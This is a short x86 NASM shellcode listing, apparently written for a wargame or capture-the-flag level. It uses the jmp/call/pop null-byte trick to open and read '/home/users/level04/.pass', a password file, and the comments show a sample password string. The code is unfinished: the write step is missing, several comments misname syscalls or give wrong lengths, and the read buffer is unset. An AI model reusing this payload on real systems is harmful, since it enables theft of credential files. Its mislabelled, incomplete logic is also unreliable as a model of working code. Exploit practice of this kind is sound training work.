BITS 32 ; Tell nasm this is 32-bit code.

	jmp short one ; Jump down to a call at the end.
two:
; int open(const char *pathname, int flags, ...
	pop ecx ; Pop the return address (string ptr) into ecx.
	xor eax, eax ; initialise register eax.
	xor ebx, ebx ; initialise register ebx.
	xor edx, edx ; initialise register edx.
	mov al, 5 ; Write syscall open.
	mov bl, 1 ; STDOUT file descriptor
	mov dl, 13 ; Length of the string
	int 0x80 ; Do syscall: write(1, string, 14) -> put the fd in eax

; ssize_t read(int fd, void buf[.count], size_t count);
	mov ebx, eax ; put the return value in ebx
	xor eax, eax ; initialise register eax.
	mov al, 3 ; Write syscall read.
	xor edx, edx ; initialise register edx.
	mov dl, 41 ; Length of the .pass (eg. kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf)
	int 0x80 ; Do syscall: read(eax, ???, 15) -> put the nb of bytes read in eax

; ssize_t write(int fd, const void *buf, size_t count);


; void _exit(int status);
	mov al, 1 ; Exit syscall #
	sub bl, 1 ; Status = 0
	int 0x80 ; Do syscall: exit(0)

one:
	call two ; Call back upwards to avoid null bytes
	db "/home/users/level04/.pass"
